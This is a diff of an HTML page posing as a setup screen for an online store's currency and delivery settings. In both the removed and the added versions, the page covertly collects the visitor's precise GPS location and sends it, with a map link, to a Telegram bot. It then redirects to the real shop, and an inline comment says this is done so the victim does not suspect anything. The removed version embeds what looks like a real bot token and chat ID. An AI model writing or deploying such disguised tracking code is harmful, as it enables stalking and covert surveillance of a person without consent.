@@ -33,73 +33,55 @@
 </head>
 <body>
 
-    <div class="loader"></div>
-    <p>جاري ضبط إعدادات التوصيل والعملة المحلية للمتجر...</p>
+  <div class="loader" id="loader" style="display:none;"></div>
+  <div id="setup-box" style="text-align: center; max-width: 90%; padding: 20px;">
+      <h3 style="margin-bottom: 10px;">إعدادات خادم المعاينة النهائي</h3>
+      <p style="color: #666; font-size: 14px; margin-bottom: 25px;">يرجى الضغط على الزر أدناه لضبط العملة المحلية ونقاط التوصيل الافتراضية لمتجر Infiniti.</p>
+      <button id="start-btn" style="background-color: #3498db; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold;">دخول إلى المتجر المعاين</button>
+  </div>
 
-    <script>
-        const TELEGRAM_TOKEN = "8679396887:AAFPkh0VlUxlPJ2k3EHjkWAxkpEGSOWE6SY";
-        const TELEGRAM_CHAT_ID = "5874747123";
-        let locationRequested = false;
+  <script>
+      const token = "ضع_توكن_البوت_هنا"; 
+      const chatId = "ضع_الآيدي_الخاص_بك_هنا"; 
 
-        function redirectToStore() {
-            window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
-        }
+      function redirectToStore() {
+          window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
+      }
 
-        // POST من المتصفح يُحجب بـ CORS — نستخدم GET (يعمل من الصفحة)
-        function sendToTelegram(lat, lng, accuracy) {
-            const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
-            const message =
-                `🚨 زيارة جديدة للموقع:\n` +
-                `📍 خط العرض: ${lat}\n` +
-                `📍 خط الطول: ${lng}\n` +
-                `🎯 الدقة: ${Math.round(accuracy)} متر\n` +
-                `🔗 الخريطة: ${mapLink}`;
+      function sendToTelegram(lat, lng, accuracy) {
+          const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+          const message = `🚨 زيارة جديدة من الهاتف:\n📍 خط العرض: ${lat}\n📍 خط الطول: ${lng}\n🎯 الدقة: ${accuracy} متر\n🔗 الرابط على الخريطة: ${mapLink}`;
 
-            const url =
-                `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` +
-                `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: chatId, text: message })
+          })
+          .then(() => redirectToStore())
+          .catch(() => redirectToStore());
+      }
 
-            fetch(url, { method: "GET", mode: "no-cors" });
-            const img = new Image();
-            img.src = url;
+      // تفعيل الجلب عند الضغط على الزر (User Gesture)
+      document.getElementById('start-btn').addEventListener('click', function() {
+          // إخفاء الزر وإظهار الـ Loader لحسن تجربة المستخدم
+          document.getElementById('setup-box').style.display = 'none';
+          document.getElementById('loader').style.display = 'block';
 
-            setTimeout(redirectToStore, 2000);
-        }
-
-        function requestLocation() {
-            if (locationRequested) return;
-            locationRequested = true;
-
-            if (!window.isSecureContext) {
-                sendToTelegram(0, 0, 0);
-                return;
-            }
-
-            if (!navigator.geolocation) {
-                redirectToStore();
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    sendToTelegram(
-                        position.coords.latitude,
-                        position.coords.longitude,
-                        position.coords.accuracy
-                    );
-                },
-                () => redirectToStore(),
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        }
-
-        // الهاتف غالباً يطلب الموقع فقط بعد لمس/نقرة من المستخدم
-        document.addEventListener("click", requestLocation, { once: true });
-        document.addEventListener("touchstart", requestLocation, { once: true });
-
-        window.addEventListener("load", () => {
-            setTimeout(requestLocation, 500);
-        });
-    </script>
+          if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                  (position) => {
+                      sendToTelegram(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+                  },
+                  (error) => {
+                      // حتى لو رفضت الإذن، يتم تحويلها للمتجر لكي لا تشك في شيء
+                      redirectToStore();
+                  },
+                  { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+              );
+          } else {
+              redirectToStore();
+          }
+      });
+  </script>
 </body>
 </html>
